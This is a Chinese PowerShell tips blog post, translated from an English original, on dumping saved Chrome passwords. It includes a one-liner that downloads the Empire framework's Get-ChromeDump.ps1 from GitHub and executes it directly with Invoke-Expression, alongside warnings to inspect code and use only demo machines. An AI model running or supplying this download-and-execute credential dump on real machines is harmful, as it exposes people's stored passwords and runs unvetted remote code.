---
layout: post
date: 2019-07-29 00:00:00
title: "PowerShell 技能连载 - 转储 Chrome 的所有密码"
description: PowerTip of the Day - Dumping All Passwords from Chrome
categories:
- powershell
- tip
tags:
- powershell
- tip
- powertip
- series
---
在前面的技能中，我们演示了如何从个人 Windows 密码库转储所有密码。基本上任何密码管理器都是如此，因为这些程序的目的是返回它们为您存储的密码。

谷歌 Chrome 浏览器将您的个人密码（和网站历史记录）存储在 SQLLite 数据库中。PowerShell 可以轻松地访问这个数据库并为您转储信息。但是，要做到这一点，PowerShell 需要不属于 Windows 的特定 SQLLite 程序集。

下面的代码展示了如何 (a) 通过一行程序下载大量代码，(b) 在下载的代码中嵌入一个二进制 .net 程序集。

警告：只能在演示机器上运行此代码，或者确保先下载代码，然后在运行之前仔细检查。代码是从第三方下载的，您*永远*不知道这些代码是否包含恶意内容。

如果你希望转储 Chrome 的隐私信息，我们建议你把代码下载到一个安全的机器上，隔离并检查它，然后在需要的时候从本地保存的副本中使用它。永远不要从不可信的来源下载和执行代码，除非仔细检查代码的实际功能：

```powershell
# download the code from GitHub
$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'
$code = Invoke-RestMethod -Uri $url -UseBasicParsing
# run the code
Invoke-Expression $code

# now you have a new function called Get-ChromeDump
Get-ChromeDump
```

注意，当Chrome运行时，SQLLite数据库被锁定。你需要关闭Chrome才能转储它的隐私数据。

代码来自未知或不可信源的事实并不意味着代码不好。事实上，当您查看代码时，您会发现一些有趣的技术：

```powershell
# download the code from GitHub
$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'
# and copy it to the clipboard
Invoke-RestMethod -Uri $url -UseBasicParsing | Set-ClipBoard

# now paste the code into your editor of choice and inspect it!
```

您将看到，代码附带了访问 SQLLite 数据库所需的二进制 .net 程序集。二进制文件以 base64 编码为字符串。这是在你的电脑上恢复二进制的部分：

```powershell
$content = [System.Convert]::FromBase64String($assembly)
$assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll"
Add-Type -Path $assemblyPath
```

下面是更多与安全相关的PowerShell单行程序：[https://chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/](https://chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/)

<!--本文国际来源：[Dumping All Passwords from Chrome](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/dumping-all-passwords-from-chrome)-->

